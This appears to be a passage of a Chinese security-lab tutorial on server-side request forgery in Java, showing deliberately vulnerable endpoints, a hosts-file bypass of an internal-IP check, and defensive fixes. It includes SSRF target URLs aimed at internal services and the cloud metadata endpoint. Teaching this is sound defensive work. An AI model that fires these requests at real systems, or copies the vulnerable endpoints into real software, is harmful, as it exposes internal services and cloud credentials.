<p><strong>SSRF（Server-Side Request Forgery）</strong>，即服务器端请求伪造。攻击者控制一个参数，让服务器主动去访问一个由他指定的 URL，从而达到探测内网、打数据库、访问云元数据服务（如 AWS 的 <code>169.254.169.254</code>）等目的。</p>
<p><strong>核心问题：不是重定向，而是“服务器能不能发出请求”。</strong></p>
<hr>
<p>二、禁止重定向 vs SSRF 的区别</p>
<p>你禁止的是 <strong>HTTP 3xx 重定向</strong>，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户访问 http://example.com =&gt; 返回 302 Location: http://malicious.com/internal</span><br></pre></td></tr></table></figure>

<p>这时候如果自动跟随重定向，就会去访问 <code>http://malicious.com/internal</code>。禁用重定向只防止了这种 <strong>间接跳转 SSRF</strong>。</p>
<p>✅ <strong>禁止重定向确实防止了这种“跳转型 SSRF”。</strong></p>
<hr>
<p>但是，<strong>普通 SSRF 根本不依赖重定向！</strong></p>
<p>比如你直接访问这个地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3306/</span><br><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://localhost:8080/actuator/env</span><br></pre></td></tr></table></figure>

<p>这些 URL <strong>根本不会返回 3xx 重定向</strong>，它们是直接请求目标服务，获取响应。</p>
<p>在你当前的代码中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpService.RequestHttpBanRedirects(url, headers);</span><br></pre></td></tr></table></figure>

<p>如果攻击者传的就是一个直连目标，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1:8080/</span><br></pre></td></tr></table></figure>

<p>你不管重定向不重定向，<strong>请求都会直接发出去</strong>，SSRF 就发生了。</p>
<h4 id="6-ssrf-restTemplate-vuln2"><a href="#6-ssrf-restTemplate-vuln2" class="headerlink" title="6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2"></a>6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln2&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">RestTemplateUrl</span><span class="params">(String url)</span>&#123;</span><br><span class="line">     <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">     headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">     <span class="keyword">return</span> httpService.RequestHttp(url, headers);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这串代码没有禁止重定向，我们可以直接SSRF</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png" alt="image-20250528192945371" loading="lazy"></p>
<h4 id="7-ssrf-hutool-vuln"><a href="#7-ssrf-hutool-vuln" class="headerlink" title="7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln"></a>7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hutool/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hutoolHttp</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个库也能ssrf，但禁止了重定向</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png" alt="image-20250528194858386" loading="lazy"></p>
<p>8.&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看checkSSRFWithoutRedirect</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。</span></span><br><span class="line"><span class="comment">    * 存在问题：</span></span><br><span class="line"><span class="comment">    *  1、TTL为0会被绕过</span></span><br><span class="line"><span class="comment">    *  2、使用重定向可绕过</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看isInternalIpByUrl函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isInternalIpByUrl</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> url2host(url);</span><br><span class="line">        <span class="keyword">if</span> (host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 异常URL当成内网IP等非法URL处理</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> host2ip(host);</span><br><span class="line">        <span class="keyword">if</span> (ip.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 如果域名转换为IP异常，则认为是非法URL</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p>
<p>给本地的hosts文件添加一条解析记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure>



<h4 id="8-ssrf-dnsrebind-vuln"><a href="#8-ssrf-dnsrebind-vuln" class="headerlink" title="8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln"></a>8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</h4><p>漏洞代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来看checkSSRFWithoutRedirect函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。</span></span><br><span class="line"><span class="comment">    * 存在问题：</span></span><br><span class="line"><span class="comment">    *  1、TTL为0会被绕过</span></span><br><span class="line"><span class="comment">    *  2、使用重定向可绕过</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>isInternalIpByUrl</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host = url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip = host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // 如果域名转换为IP异常，则认为是非法URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p>
<p>给本地的hosts文件添加一条解析记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure>

<p>然后就可以实现ssrf</p>
<h4 id="ssrf的修复与防护"><a href="#ssrf的修复与防护" class="headerlink" title="ssrf的修复与防护"></a>ssrf的修复与防护</h4><p>（1）限制协议使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/urlConnection/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionSec</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decline not http/https protocol</span></span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-] SSRF check failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>isHttp函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isHttp</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> url.startsWith(<span class="string">&quot;http://&quot;</span>) || url.startsWith(<span class="string">&quot;https://&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>会检查 <code>url</code> 是否是 <code>http://</code> 或 <code>https://</code> 协议，如果不是则直接返回 <code>&quot;[-] SSRF check failed&quot;</code>，防止 <code>file://</code>、<code>ftp://</code>、<code>gopher://</code> 等协议的 SSRF 利用</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png" alt="image-20250724085008108" loading="lazy"></p>
<p>（2）限制文件访问</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ImageIO/sec&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">ImageIO</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         SecurityUtil.startSSRFHook();</span><br><span class="line">         HttpUtils.imageIO(url);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">         <span class="keyword">return</span> e.getMessage();</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         SecurityUtil.stopSSRFHook();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;ImageIO ssrf test&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>imageIO</code>函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">imageIO</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            ImageIO.read(u); <span class="comment">// send request</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>（3）http请求检查</p>
<p>方法1：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/okhttp/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">okhttp</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.okhttp(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>okhttp</code>函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">okhttp</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    com.squareup.okhttp.<span class="type">Request</span> <span class="variable">ok_http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">    <span class="keyword">return</span> client.newCall(ok_http).execute().body().string();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>方法2：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/httpclient/sec&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           SecurityUtil.startSSRFHook();</span><br><span class="line">           <span class="keyword">return</span> HttpUtils.httpClient(url);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.getMessage();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           SecurityUtil.stopSSRFHook();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>httpClient</code>函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">httpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">CloseableHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">            <span class="comment">// set redirect enable false</span></span><br><span class="line">            <span class="comment">// httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());</span></span><br><span class="line">            <span class="type">HttpResponse</span> <span class="variable">httpResponse</span> <span class="operator">=</span> client.execute(httpGet); <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpResponse.getEntity().getContent()));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = rd.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                result.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>方法3：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/commonsHttpClient/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">commonsHttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.commonHttpClient(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>commonHttpClient</code>函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">commonHttpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpClient</span>();</span><br><span class="line">    <span class="type">GetMethod</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetMethod</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client.executeMethod(method); <span class="comment">// send request</span></span><br><span class="line">        <span class="type">byte</span>[] resBody = method.getResponseBody();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(resBody);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Release the connection.</span></span><br><span class="line">        method.releaseConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>方法4：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/Jsoup/sec&quot;)</span><br><span class="line">public String Jsoup(@RequestParam String url) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.Jsoup(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Jsoup函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Jsoup</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> Jsoup.connect(url)</span><br><span class="line"><span class="comment">//                    .followRedirects(false)</span></span><br><span class="line">                    .timeout(<span class="number">3000</span>)</span><br><span class="line">                    .cookie(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;joychou&quot;</span>) <span class="comment">// request cookies</span></span><br><span class="line">                    .execute().parse();</span><br><span class="line">            <span class="keyword">return</span> doc.outerHtml();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法5：</p>
